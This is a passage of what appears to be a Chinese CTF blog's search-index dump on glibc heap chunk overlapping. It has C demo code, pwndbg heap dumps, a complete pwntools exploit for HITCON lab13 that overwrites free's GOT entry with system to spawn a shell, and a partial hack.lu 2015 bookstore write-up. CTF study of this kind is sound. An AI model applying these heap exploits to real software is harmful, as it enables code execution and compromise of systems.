\u533a\u57df\u91cd\u65b0\u5360\u4f4d\u540e\uff0c\u5176\u4e2d 0x10 \u7684 fastbin \u5757\u4f9d\u7136\u53ef\u4ee5\u6b63\u5e38\u7684\u5206\u914d\u548c\u91ca\u653e\uff0c\u6b64\u65f6\u5df2\u7ecf\u6784\u6210 overlapping\uff0c\u901a\u8fc7\u5bf9 overlapping \u7684\u8fdb\u884c\u64cd\u4f5c\u53ef\u4ee5\u5b9e\u73b0 fastbin attack\u3002","title":"\u57fa\u672c\u793a\u4f8b 4\uff1a\u901a\u8fc7 extend \u540e\u5411 overlapping"},{"location":"Pwn/glibc-heap/%E5%A0%86%E9%87%8D%E5%8F%A0%26%E6%8B%93%E5%B1%95/#5-extend-overlapping","text":"\u8fd9\u91cc\u5c55\u793a\u901a\u8fc7\u4fee\u6539 pre_inuse \u57df\u548c pre_size \u57df\u5b9e\u73b0\u5408\u5e76\u524d\u9762\uff08\u4f4e\u5730\u5740\uff09\u7684\u5757 int main ( void ) { void * ptr1 , * ptr2 , * ptr3 , * ptr4 ; ptr1 = malloc ( 128 ); //smallbin1 ptr2 = malloc ( 0x10 ); //fastbin1 ptr3 = malloc ( 0x10 ); //fastbin2 ptr4 = malloc ( 128 ); //smallbin2 malloc ( 0x10 ); //\u9632\u6b62\u4e0etop\u5408\u5e76 free ( ptr1 ); * ( int * )(( long long ) ptr4 -0x8 ) = 0x90 ; //\u4fee\u6539pre_inuse\u57df\uff0cprev_inuse * ( int * )(( long long ) ptr4 -0x10 ) = 0xd0 ; //\u4fee\u6539pre_size\u57df\uff0cprev_size free ( ptr4 ); //unlink\u8fdb\u884c\u524d\u5411extend malloc ( 0x150 ); //\u5360\u4f4d\u5757 } \u8fd9\u91cc\u4f8b\u5b50\u8c03\u8bd5\u4e00\u76f4\u51fa\u4e0d\u6765\u5806\u4fe1\u606f\uff0c\u5c31\u6587\u5b57\u63cf\u8ff0\u4e00\u4e0b\uff1a\uff08\u5927\u4f6c\u7b14\u8bb0\uff1a https://bbs.pediy.com/thread-260316.htm \uff09 \u5148\u5e03\u7f6e\u597d 5 \u4e2a\u5806\u5757\uff0c\u7136\u540e\u91ca\u653e ptr1 \u8fdb\u5165\u5230 unsortedbin \u3002 \u4fee\u6539 ptr4 \u7684 prev_inuse \u4e3a 0 \u6807\u8bb0\u524d\u4e00\u4e2a\u5806\u5757\u91ca\u653e\uff08\u7a7a\u95f2\uff09\uff0c\u7ed5\u8fc7 next_chunk inuse \u68c0\u67e5\u3002 \u4fee\u6539 ptr4 \u7684 prev_size \u4e3a ptr1+ptr2+ptr3 \uff0c\u7ed5\u8fc7 next_chunk size == chunk size \u68c0\u67e5\u3002 \u91ca\u653e ptr4 \u4f1a\u89e6\u53d1\u56de\u6536\u673a\u5236\uff0c\u4e5f\u5c31\u662f\u5408\u5e76\u7269\u7406\u76f8\u90bb\u7684\u5806\uff0c\u7528\u5230\u7684\u64cd\u4f5c\u662f unlink \uff0c\u5c31\u5c06 ptr1~4 \u5f53\u505a\u4e00\u4e2a\u5806\u5757\u653e\u5165 unsortedbin\u3002 \u524d\u5411 extend \u5229\u7528\u4e86 smallbin \u7684 unlink \u673a\u5236\uff0c\u901a\u8fc7\u4fee\u6539 pre_size \u57df\u53ef\u4ee5\u8de8\u8d8a\u591a\u4e2a chunk \u8fdb\u884c\u5408\u5e76\u5b9e\u73b0 overlapping\u3002","title":"\u57fa\u672c\u793a\u4f8b 5\uff1a\u901a\u8fc7 extend \u524d\u5411 overlapping"},{"location":"Pwn/glibc-heap/%E5%A0%86%E9%87%8D%E5%8F%A0%26%E6%8B%93%E5%B1%95/#hitcon-trainging-lab13","text":"\u9898\u76ee\u94fe\u63a5","title":"HITCON Trainging lab13"},{"location":"Pwn/glibc-heap/%E5%A0%86%E9%87%8D%E5%8F%A0%26%E6%8B%93%E5%B1%95/#_5","text":"Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE ( 0x400000 ) \u7a0b\u5e8f\u4e3a 64 \u4f4d\u52a8\u6001\u94fe\u63a5\u7a0b\u5e8f\uff0c\u4e3b\u8981\u5f00\u542f\u4e86 Canary \u4fdd\u62a4\u4e0e NX \u4fdd\u62a4\uff0c\u8fd8\u6709\u4e00\u70b9\u5c31\u662f RELRO: Partial RELRO GOT \u8868\u53ef\u4ee5\u4fee\u6539\u3002","title":"\u57fa\u672c\u4fe1\u606f"},{"location":"Pwn/glibc-heap/%E5%A0%86%E9%87%8D%E5%8F%A0%26%E6%8B%93%E5%B1%95/#_6","text":"\u7a0b\u5e8f\u662f\u4e00\u4e2a\u5806\u7ba1\u7406\u5668\uff0c\u6709\u589e\u5220\u67e5\u6539\u529f\u80fd\u3002 \u6bcf\u4e2a content \u5806\u5757\u7528\u4e00\u4e2a 0x10 \u7684\u7ed3\u6784\u4f53\u5806\u53bb\u7ef4\u62a4\uff0c\u7ed3\u6784\u4f53\u5982\u4e0b\uff1a struct chunk { size_t size ; //context \u5927\u5c0f _QWORD * chunk ; //context \u6307\u9488 }","title":"\u57fa\u672c\u529f\u80fd"},{"location":"Pwn/glibc-heap/%E5%A0%86%E9%87%8D%E5%8F%A0%26%E6%8B%93%E5%B1%95/#_7","text":"edit \u3001 show \u529f\u80fd\u90fd\u5b58\u5728 off-by-one \uff0c\u4e24\u8005\u51fa\u73b0\u903b\u8f91\u3001\u5730\u65b9\u4e00\u81f4\uff0c\u9020\u6210\u5f71\u54cd\u7684 edit \uff0c\u8fd9\u91cc\u5c31\u4ee5 edit \u53d9\u8ff0\u3002 \u53ef\u4ee5\u770b\u5230 19 \u884c\u5199\u5165\u6570\u636e\u7684\u65f6\u5019\u4f20\u5165\u7684\u957f\u5ea6\u53c2\u6570\u88ab\u6545\u610f\u52a0 1 \u4e86\uff0c\u9020\u6210\u6ea2\u51fa\u53ef\u63a7\u7684\u4e00\u5b57\u8282\u3002","title":"\u6f0f\u6d1e\u51fd\u6570"},{"location":"Pwn/glibc-heap/%E5%A0%86%E9%87%8D%E5%8F%A0%26%E6%8B%93%E5%B1%95/#_8","text":"\u5229\u7528 off-by-one \u8986\u76d6\u4e0b\u4e00\u4e2a chunk \u7684 size \uff08\u8fd9\u91cc\u4fee\u6539\u7684\u662f\u7ed3\u6784\u4f53 chunk \uff09\uff0c\u4f2a\u9020 chunk \u5927\u5c0f \u91ca\u653e\u88ab\u6ea2\u51fa chunk \u540e\uff0c\u7533\u8bf7\u4f2a\u9020 chunk \uff0c\u9020\u6210 chunk overlap\uff08\u5806\u91cd\u53e0\uff09\uff0c\u4ece\u800c\u63a7\u5236\u65b0\u7ed3\u6784\u4f53\u7684\u6307\u9488\u3002 \u5148\u5e03\u7f6e\u597d\u5185\u5b58\u7a7a\u95f4\uff1a create ( 0x18 , 'a' * 0x10 ) #0 create ( 0x10 , 'b' * 0x10 ) #1 chunk0 content \u5927\u5c0f\u8981\u6c42\u662f\u7528\u5230\u4e0b\u4e00\u4e2a chunk \u7684 prev_size \u7528\u4e8e\u6ea2\u51fa\u4fee\u6539\u4e0b\u4e00\u4e2a chunk \u7684 size \u3002 chunk1 content \u5927\u5c0f\u6700\u597d\u662f 0x10 \uff0c\u8fd9\u6837\u6211\u4eec\u6ea2\u51fa\u4fee\u6539\u3001\u91ca\u653e chunk1 \u540e\u518d\u7533\u8bf7\u4e00\u4e2a chunk \u7ed3\u6784\u4f53\u5c31\u4f1a\u7528\u8fd9\u4e2a chunk1 content \u7a7a\u95f4\uff08\u4e3a\u4ec0\u4e48\u4e0d\u7528\u539f\u6765\u7684\uff1f \u5c0f\u7ed3 \uff09\u3002\u5f53\u7136\u4e5f\u53ef\u4ee5\u7528\u5176\u4ed6\u5927\u5c0f\uff0c\u81ea\u884c\u8c03\u8bd5\u5373\u53ef\u3002\u8fd9\u91cc\u4e3e\u4e00\u4e2a\u4f8b\u5b50\uff1achunk1 content size 0x30 \uff0c\u6ea2\u51fa\u4fee\u6539\u7ed3\u6784\u4f53 size \u4e3a\uff1a0x71 \u3002 \u5806\u7ed3\u6784\u5982\u4e0b\uff1a pwndbg> x /20gx 0xac4000 0xac4000: 0x0000000000000000 0x0000000000000021 0xac4010: 0x0000000000000018 0x0000000000ac4030 0xac4020: 0x0000000000000000 0x0000000000000021 0xac4030: 0x6161616161616161 0x6161616161616161 0xac4040: 0x0000000000000000 0x0000000000000021 0xac4050: 0x0000000000000010 0x0000000000ac4070 0xac4060: 0x0000000000000000 0x0000000000000021 0xac4070: 0x6262626262626262 0x6262626262626262 0xac4080: 0x0000000000000000 0x0000000000020f81 0xac4090: 0x0000000000000000 0x0000000000000000 \u7136\u540e\u4fee\u6539 chunk0 \u6ea2\u51fa\u4fee\u6539\u4e0b\u4e00\u4e2a chunk size\uff0c\u8fd9\u91cc\u628a /bin/sh\\x00 \u4e5f\u4e00\u8d77\u5199\u5165\uff1a edit ( 0 , \"/bin/sh \\x00 \" . ljust ( 0x18 , 'a' ) + \" \\x41 \" ) \u4fee\u6539\u540e chunk1 \u7ed3\u6784\u4f53\u5c31\u5c06 chunk1 content \u4e5f\u5305\u542b\u8fdb\u6765\u4e86\uff0c\u91ca\u653e\u7684\u65f6\u5019\u4f1a\u653e\u5165 0x40 \u7684 fastbin \u4e2d\u3002 \u5806\u7ed3\u6784\u5982\u4e0b\uff1a pwndbg> x /20gx 0xac4000 0xac4000: 0x0000000000000000 0x0000000000000021 0xac4010: 0x0000000000000018 0x0000000000ac4030 0xac4020: 0x0000000000000000 0x0000000000000021 0xac4030: 0x0068732f6e69622f 0x6161616161616161 0xac4040: 0x6161616161616161 0x0000000000000041 //chunk1 struct 0xac4050: 0x0000000000000010 0x0000000000ac4070 0xac4060: 0x0000000000000000 0x0000000000000021 //chunk1 content 0xac4070: 0x6262626262626262 0x6262626262626262 0xac4080: 0x0000000000000000 0x0000000000020f81 0xac4090: 0x0000000000000000 0x0000000000000000 \u91ca\u653e chunk1 free ( 1 ) pwndbg> bin fastbins 0x20: 0xac4060 \u25c2\u2014 0x0 //chunk1 content 0x30: 0x0 0x40: 0xac4040 \u25c2\u2014 0x0 //chunk1 struct 0x50: 0x0 0x60: 0x0 0x70: 0x0 0x80: 0x0 \u5c06\u8fd9\u4e24\u4e2a\u7a7a\u95f2\u5806\u7533\u8bf7\u51fa\u6765\uff0c\u7531\u4e8e malloc \u673a\u5236\uff0c\u7533\u8bf7\u76f8\u540c\u5927\u5c0f\u7684 chunk \u624d\u4f1a\u7528 fastbin \u4e2d\u7a7a\u95f2\u5185\u5b58\u30020x20 \u4f1a\u7528\u4f5c\u65b0 chunk \u7684\u7ed3\u6784\u4f53\uff0c0x40 \u4f1a\u7528\u4f5c\u65b0 chunk \u7684 content \u3002 create ( 0x30 , 'a' * 0x18 + p64 ( 0x21 ) + p64 ( 0x30 ) + p64 ( free_got )) \u8fd9\u91cc\u4e3a\u4e86\u65b9\u4fbf\u7528 chunk1' \u8868\u793a\u65b0\u7533\u8bf7\u7684\u5806\uff0c\u5b9e\u9645\u4e0a\u8fd9\u4e2a\u5806\u5e8f\u53f7\u8fd8\u662f 1 \uff0c\u5806\u7ed3\u6784\u5982\u4e0b\uff1a pwndbg> x /20gx 0xac4000 0xac4000: 0x0000000000000000 0x0000000000000021 0xac4010: 0x0000000000000018 0x0000000000ac4030 0xac4020: 0x0000000000000000 0x0000000000000021 0xac4030: 0x0068732f6e69622f 0x6161616161616161 0xac4040: 0x6161616161616161 0x0000000000000041 //chunk1' content 0xac4050: 0x6161616161616161 0x6161616161616161 0xac4060: 0x6161616161616161 0x0000000000000021 //chunk1' struct 0xac4070: 0x0000000000000030 0x0000000000602018 0xac4080: 0x0000000000000000 0x0000000000020f81 0xac4090: 0x0000000000000000 0x0000000000000000 \u7136\u540e\u5c31\u662f\u6cc4\u9732 libc \u5730\u5740\uff0c\u4fee\u6539 GOT \u8868\uff0c\u6700\u540e\u89e6\u53d1 system('/bin/sh')","title":"\u601d\u8def"},{"location":"Pwn/glibc-heap/%E5%A0%86%E9%87%8D%E5%8F%A0%26%E6%8B%93%E5%B1%95/#exp","text":"#!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : heapcreator.py from pwn import * context . log_level = 'debug' p = process ( \"./heapcreator\" ) elf = ELF ( \"./heapcreator\" ) libc = ELF ( \"/lib/x86_64-linux-gnu/libc.so.6\" ) def create ( size , context ): p . recvuntil ( \"choice :\" ) p . sendline ( \"1\" ) p . recvuntil ( \"Heap : \" ) p . sendline ( str ( size )) p . recvuntil ( \"heap:\" ) p . send ( context ) def edit ( id , context ): p . recvuntil ( \"choice :\" ) p . sendline ( \"2\" ) p . recvuntil ( \"Index :\" ) p . sendline ( str ( id )) p . recvuntil ( \"heap :\" ) p . send ( context ) def show ( id ): p . recvuntil ( \"choice :\" ) p . sendline ( \"3\" ) p . recvuntil ( \"Index :\" ) p . sendline ( str ( id )) def free ( id ): p . recvuntil ( \"choice :\" ) p . sendline ( \"4\" ) p . recvuntil ( \"Index :\" ) p . sendline ( str ( id )) def exit (): p . recvuntil ( \"choice :\" ) p . sendline ( \"5\" ) # off-by-one create ( 0x18 , 'a' * 0x10 ) #0 create ( 0x10 , 'b' * 0x10 ) #1 edit ( 0 , \"/bin/sh \\x00 \" . ljust ( 0x18 , 'a' ) + \" \\x41 \" ) free ( 1 ) # leak libc free_got = elf . got [ 'free' ] create ( 0x30 , 'a' * 0x18 + p64 ( 0x21 ) + p64 ( 0x30 ) + p64 ( free_got )) show ( 1 ) p . recvuntil ( \"Content : \" ) free_addr = u64 ( p . recv ( 6 ) . ljust ( 8 , ' \\x00 ' )) log . info ( \"free_addr:\" + hex ( free_addr )) libc_base = free_addr - libc . symbols [ 'free' ] log . info ( \"libc_base:\" + hex ( libc_base )) system = libc_base + libc . symbols [ 'system' ] log . info ( \"system:\" + hex ( system )) edit ( 1 , p64 ( system )) #gdb.attach(p) free ( 0 ) p . interactive ()","title":"EXP"},{"location":"Pwn/glibc-heap/%E5%A0%86%E9%87%8D%E5%8F%A0%26%E6%8B%93%E5%B1%95/#_9","text":"\u5206\u914d\u5927\u5c0f\u5728 fastbin \u8303\u56f4\u5185\u7684\u65b0\u5806\u5757\uff0c\u9700\u8981\u5927\u5c0f\u5339\u914d\u7528 fastbin \u7684\u7a7a\u95f2\u5806\u5757\u3002\u4e3e\u4e2a\u4f8b\u5b50\uff1afastbin \u4e2d\u6709\u4e00\u4e2a 0x20 \u7684\u7a7a\u95f2\u5806\u5757\uff0c\u9700\u8981\u5206\u914d\u4e00\u4e2a 0x40 \u5806\u5757\uff0c\u4f1a\u4ece topchunk \u4e2d\u5206\u5272 0x40 \u51fa\u6765\uff08\u5982\u679c\u53ef\u4ee5\uff09\u3002","title":"\u5c0f\u7ed3"},{"location":"Pwn/glibc-heap/%E5%A0%86%E9%87%8D%E5%8F%A0%26%E6%8B%93%E5%B1%95/#2015-hacklu-bookstore","text":"\u9898\u76ee\u94fe\u63a5","title":"2015 hacklu bookstore"},{"location":"Pwn/glibc-heap/%E5%A0%86%E9%87%8D%E5%8F%A0%26%E6%8B%93%E5%B1%95/#_10","text":"64 \u4f4d\u52a8\u6001\u94fe\u63a5\u7684\u7a0b\u5e8f\u3002 books: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=3a15f5a8e83e55c535d220473fa76c314d26b124, stripped Arch: amd64-64-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000)","title":"\u57fa\u672c\u4fe1\u606f"},{"location":"Pwn/glibc-heap/%E5%A0%86%E9%87%8D%E5%8F%A0%26%E6%8B%93%E5%B1%95/#_11","text":"\u7a0b\u5e8f\u662f\u4e00\u4e2a\u4e70\u4e66\u7684\u7cfb\u7edf\uff0c\u6700\u591a\u53ea\u80fd\u8d2d\u4e70\u4e24\u672c\u4e66\u3002\u6bcf\u4e00\u672c\u4e66\u90fd\u7528\u4e00\u4e2a\u72ec\u7acb\u7684\u5806\u53bb\u7ef4\u62a4\uff0c\u8fd9\u4e2a\u5806\u662f\u7a0b\u5e8f\u81ea\u884c\u7533\u8bf7\u7684\uff0c\u4e0d\u80fd\u4eba\u5de5\u5e72\u9884\u7684\uff0c\u56fa\u5b9a\u5927\u5c0f\u4e3a 0x80 \u3002 \u53ef\u4ee5\u65b0\u589e\u3001\u5220\u9664\u4e66\u7c4d\uff0c\u6700\u540e\u63d0\u4ea4\u662f\u4f1a\u5c06\u4e24\u672c\u4e66\uff08\u4e24\u4e2a\u5806\uff09\u4fe1\u606f\u5408\u5e76\u5230\u4e00\u4e2a\u65b0\u7684\u5806\u4e2d\uff0c\u7136\u540e\u8fdb\u884c\u8f93\u51fa\u3002","title":"\u57fa\u672c\u529f\u80fd"},{"location":"Pwn/glibc-heap/%E5%A0%86%E9%87%8D%E5%8F%A0%26%E6%8B%93%E5%B1%95/#_12","text":"","title":"\u6f0f\u6d1e\u51fd\u6570"},{"location":"Pwn/glibc-heap/%E5%A0%86%E9%87%8D%E5%8F%A0%26%E6%8B%93%E5%B1%95/#_13","text":"\u5f55\u5165\u4e66\u7c4d\u4fe1\u606f\u7528\u4e00\u4e2a\u81ea\u5b9a\u4e49\u8f93\u5165\u51fd\u6570\uff0c\u8fd9\u4e2a\u51fd\u6570\u5b58\u5728\u4e00\u4e2a\u5806\u6ea2\u51fa\u7684\u95ee\u9898\u3002\u7ed3\u675f\u8f93\u5165\u7684\u5224\u65ad\u6807\u51c6\u662f\u9047\u5230 \\n \uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\u81ea\u5b9a\u4e49\u8f93\u5165\u51fd\u6570\u4f1a\u5728\u8f93\u5165\u5b57\u7b26\u4e32\u6700\u540e\u52a0\u4e0a\u4e00\u4e2a \\x00 \uff1a","title":"\u5806\u6ea2\u51fa"},{"location":"Pwn/glibc-heap/%E5%A0%86%E9%87%8D%E5%8F%A0%26%E6%8B%93%E5%B1%95/#uaf","text":"\u7a0b\u5e8f\u7684\u5220\u9664\u51fd\u6570\u53ea\u662f\u5c06\u5806\u91ca\u653e\uff0c\u5e76\u6ca1\u6709\u5c06\u6307\u9488\u7f6e\u96f6\uff1a","title":"UAF"},{"location":"Pwn/glibc-heap/%E5%A0%86%E9%87%8D%E5%8F%A0%26%E6%8B%93%E5%B1%95/#_14","text":"\u7a0b\u5e8f\u9000\u51fa\u6253\u5370\u4fe1\u606f\u65f6\uff0c\u4f1a\u51fa\u73b0\u4e00\u4e2a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff1a","title":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32"},{"location":"Pwn/glibc-heap/%E5%A0%86%E9%87%8D%E5%8F%A0%26%E6%8B%93%E5%B1%95/#_15","text":"\u83dc\u5355\u9009\u62e9\u8f93\u5165\u957f\u5ea6\u4e0a\u9650\u4e3a 0x80 \uff0c\u8fd9\u91cc\u4e0d\u7b97\u662f\u4e00\u4e2a\u6f0f\u6d1e\uff0c\u4f46\u662f\u4f1a\u5728\u540e\u9762\u5229\u7528\u5f53\u4e2d\u8fd0\u7528\u5230\u3002","title":"\u5947\u602a\u7684\u8f93\u5165\u957f\u5ea6"},{"location":"Pwn/glibc-heap/%E5%A0%86%E9%87%8D%E5%8F%A0%26%E6%8B%93%E5%B1%95/#_16","text":"\u8fd9\u6761\u9898\u76ee\u5229\u7528\u8d77\u6765\u6bd4\u8f83\u590d\u6742\uff0c\u6d89\u53ca\u5230\u5806\u6ea2\u51fa\u3001\u5806\u91cd\u53e0\u3001\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3001\u52ab\u6301 fini_array \u3002\u4e0b\u9762\u5148\u5199\u51fa\u5927\u81f4\u6b65\u9aa4 free book2 \u5229\u7528\u5806\u6ea2\u51fa\u4fee\u6539\u5728 bin \u4e2d\u7684 book2 size \u4e3a 0x151 \uff0c\u8ba9 summit \u7533\u8bf7\u7684 chunk \u653e\u5728\u8fd9\u91cc\uff1b\u5199\u5165\u7cbe\u5fc3\u5e03\u7f6e\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u548c padding \uff0c\u52ab\u6301 fini_array \u3001\u6cc4\u9732\u5730\u5740 \u7b2c\u4e8c\u8f6e\u8fd0\u884c\u7a0b\u5e8f\uff1a free book2 \u5229\u7528\u5806\u6ea2\u51fa\u4fee\u6539\u5728 bin \u4e2d\u7684 book2 size \u4e3a 0x151 \uff0c\u8ba9 summit \u7533\u8bf7\u7684 chunk \u653e\u5728\u8fd9\u91cc\uff1b\u5199\u5165\u7cbe\u5fc3\u5e03\u7f6e\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u548c padding \uff0c\u4fee\u6539\u8fd4\u56de\u5730\u5740\u4e3a one_gadget \u4ea7\u751f\u8fd9\u79cd\u89e3\u9898\u601d\u8def\u601d\u8003\u65b9\u5411\uff1a\u5148\u7740\u773c\u7b80\u5355\u3001\u5df2\u7ecf\u5b66\u8fc7\u719f\u6089\u7684\u6f0f\u6d1e\uff0c\u4e5f\u5c31\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u8fd9\u4e2a\u6f0f\u6d1e\u3002\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u8bdd\uff0c\u5c31\u662f\u4fee\u6539 got \u8868\u6216\u8005\u8fd4\u56de\u5730\u5740\u7b49\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b getshell \u3002 \u8fd9\u91cc \u683c\u5f0f\u5316\u5b57\u7b26\u4e32 \u51fa\u73b0\u5728\u6700\u540e\u4e00\u4e2a printf \uff0c\u4e5f\u5c31\u662f\u8f93\u51fa\u5b8c\u6210\u4e4b\u540e\u7a0b\u5e8f\u5c31\u4f1a\u9000\u51fa\u3002 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u5185\u5bb9\u662f\u4ece submit \u7533\u8bf7\u7684 dest \u4e2d\u8bfb\u53d6\u7684\u3002 \u7528\u6237\u65e0\u6cd5\u81ea\u884c\u5206\u914d\u5806\uff0c\u53ea\u80fd\u4ece\u7a0b\u5e8f\u672c\u8eab\u7533\u8bf7\u7684 3 \u5757\u5806\u548c submit \u529f\u80fd\u8bbe\u6cd5\u5229\u7528\u3002","title":"\u601d\u8def"},{"location":"Pwn/glibc-heap/%E5%A0%86%E9%87%8D%E5%8F%A0%26%E6%8B%93%E5%B1%95/#_17","text":"\u5148\u6765\u89e3\u51b3\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5185\u5bb9\u7684\u95ee\u9898\u3002\u5185\u5bb9\u662f\u4ece dest \u4e2d\u8bfb\u53d6\u7684\uff0c\u5c31\u8981\u8bbe\u6cd5\u63a7\u5236 dest \u5185\u5bb9\u3002\u8fd9\u91cc\u5229\u7528\u7684\u662f overlapping \u5806\u91cd\u53e0\uff0c\u5c06 chunk2 \u548c chunk3 \u91cd\u53e0\u8d77\u6765\uff0c\u5229\u7528 submit \u590d\u5236\u529f\u80fd\u6ea2\u51fa\u63a7\u5236 dest \u4e2d\u7684\u5185\u5bb9\u3002 \u9020\u6210 overlapping \u5148 free chunk2 \uff0c\u518d\u901a\u8fc7\u5199\u5165 book1 \u529f\u80fd\u6ea2\u51fa\u4fee\u6539 chunk2 \u7684 size \u5b57\u6bb5\u4e3a 0x151 \u3002\u8fd9\u6837\u5f53 submit \u529f\u80fd\u7533\u8bf7 0x140 \u5806\u5757\uff08\u4e0d\u542bchunk header\uff09\u7684\u65f6\u5019\u5c31\u4f1a\u53bb\u5230 unsortedbin \u4e2d\u627e\u5230\u88ab\u6211\u4eec\u4fee\u6539\u5927\u5c0f\u4e3a 0x151 \u7684 chunk2 \u3002 submit \u529f\u80fd\u6b63\u5e38\u60c5\u51b5\u4e0b\u590d\u5236\u7684\u5185\u5bb9\u662f\u8fd9\u6837\u7684\uff1a \"Order 1: \" + book1 + \"\\nOrder 2: \" + book2 + '\\n' \u4f46\u662f\u6211\u4eec\u5c06 chunk2 chunk3 \u91cd\u53e0\u5728\u4e00\u8d77\uff0c\u4e14 chunk header \u662f\u540c\u4e00\u5730\u5740\u3002\u7b80\u5355\u70b9\u5c31\u662f\u4e24\u4e2a\u5806\u5f00\u59cb\u5730\u5740\u76f8\u540c\uff0c\u7ed3\u675f\u5730\u5740\u4e0d\u540c\u3002 chunk1 chunk2 \u5730\u5740\u6307\u9488\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u6ca1\u6709\u88ab\u4e8c\u6b21\u8d4b\u503c\uff0c\u4e00\u76f4\u4fdd\u5b58\u7740\u7533\u8bf7\u5806\u65f6\u7684\u5730\u5740\u3002\uff08free chunk2 \u65f6\u56e0\u4e3a\u6709 UAF \u6f0f\u6d1e\uff0c\u6240\u4ee5\u6ca1\u88ab\u91cd\u7f6e\u3002\uff09\u9020\u6210\u7684\u5f71\u54cd\u5c31\u662f chunk2 \u7684\u5185\u5bb9 submit \u7684\u65f6\u5019\u88ab\u5199\u4e3a \"Order 1: \" + book1 \uff0c\u8be6\u7ec6\u8fc7\u7a0b\u5982\u4e0b\uff1a submit \u5904\u7406 chunk1 \u4fe1\u606f\uff0c\u5411 chunk3\uff08\u5373chunk2\uff09\u5199\u5165\uff1a \"Order 1: \" + book1 submit \u5904\u7406 chunk2 \u4fe1\u606f\uff0c\u5411 chunk3\uff08\u5373chunk2\uff09\u5199\u5165\uff1a \"\\nOrder 2: \" + \"Order 1: \" + book1 + '\\n' \u5148\u770b\u770b chunk1\u3001chunk2\uff08chunk3\uff09\u3001dest \u4e09\u4e2a\u5806\u7684\u5206\u5e03\u60c5\u51b5\uff1a \u6211\u4eec\u63a7\u5236 chunk1 \u5185\u5bb9\uff0c\u5199\u5165\u6709\u6548 payload \u548c padding \uff0c\u5c06\u6709\u6548 payload \u6ea2\u51fa\u5199\u5165\u5230 dest \uff08fd \u6307\u9488\u5904\u5f00\u59cb\uff09\u3002\u6362\u53e5\u8bdd\u5c31\u662f\u6211\u4eec\u5e0c\u671b\u56fe\u4e0a 0xef3010 \u5f00\u59cb\u5199\u5165\u7684\u5185\u5bb9\uff0c\u590d\u5236\u5230 0xef3130 \u3002\u53ef\u4ee5\u5f97\u51fa\u8ba1\u7b97\u516c\u5f0f\uff1a\uff08\"\" \u4e0d\u7b97\u4e2a\u6570\uff09 # \u9700\u8981\u5728\u590d\u5236\u7b2c\u4e8c\u4e2achunk1\u524d\uff0c\u586b\u5145\u597d0x90\u5b57\u8282\uff0c\u4e5f\u5c31\u662fchunk2(3) fd\u5f00\u59cb\u5230dest fd\u5f00\u59cb\u7684\u8ddd\u79bb\uff0c\u8fd9\u6837chunk1\u5c31\u4f1a\u88ab\u590d\u5236\u5230dest fd\u5f00\u59cb \"Order 1:\" + chunk1 + \"\\n\" + \"Order 2:\" + \"Order 1:\" == 0x90 # \u5316\u7b80\u4e3a chunk1 == 0x90 - 28 == 0x74 \u5f97\u51fa\u7ed3\u8bba\uff1a\u5c06\u6709\u6548 payload \u5199\u5728 chunk1 \u5f00\u5934\uff0c\u7136\u540e\u5c06 chunk1 \u7528\u975e \\x00 \u586b\u5145\u957f\u5ea6\u4e3a 0x74 \uff0c\u5f53submit \u7684\u65f6\u5019\uff0c\u6709\u6548 payload \u5c31\u4f1a\u653e\u5728 dest \u7684 fd \u3002\u8fd9\u6837\u5c31\u83b7\u5f97\u4e00\u4e2a\u4efb\u610f\u8bfb\u5199\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\uff0c\u9700\u8981\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6cc4\u9732\u3001\u4fee\u6539\u63d0\u524d\u5728\u4fee\u6539 chunk1 \u65f6\u5199\u5165\u5373\u53ef\u3002 \u76ee\u524d\u5f97\u51fa payload \uff1a payload1 = 'b' * 8 #\u683c\u5f0f\u5316\u5b57\u7b26\u4e32 payload1 = payload1 . ljust ( 0x74 , 'a' ) . ljust ( 0x88 , ' \\x00 ' ) payload1 += p64 ( 0x151 ) edit ( 1 , payload1 )","title":"\u63a7\u5236\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5185\u5bb9"},{"location":"Pwn/glibc-heap/%E5%A0%86%E9%87%8D%E5%8F%A0%26%E6%8B%93%E5%B1%95/#fini_array","text":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5185\u5bb9\u5df2\u7ecf\u8bbe\u6cd5\u63a7\u5236\u4e86\uff0c\u4f46\u662f getshell \u9700\u8981\u4e24\u6b21\u4f7f\u7528\u8fd9\u4e2a\u6f0f\u6d1e\uff0c\u4e00\u6b21\u6cc4\u9732\u5730\u5740\uff0c\u4e00\u6b21\u4fee\u6539\u5730\u5740\u3002 \u8fd9\u91cc\u5c31\u9700\u8981\u7528\u5230\u4e00\u4e2a\u77e5\u8bc6\uff0cmain \u51fd\u6570\u662f\u4e8c\u5f1f\uff0c\u4ed6\u6709\u5927\u54e5\uff0c\u6709\u4e09\u5f1f\u3002\u7a0b\u5e8f\u5f00\u59cb\u5148\u8fd0\u884c\u4e00\u6b21\u5927\u54e5\uff0c\u5728\u8fd0\u884c main \uff0c\u6700\u540e\u8fd0\u884c\u4e09\u5f1f\u3002\u4e09\u5f1f\u5f53\u505a\u6709\u4e2a\u6570\u7ec4\uff1a .fini_array \u3002\u7a0b\u5e8f\u9000\u51fa\u540e\u4f1a\u6267\u884c .fini_array 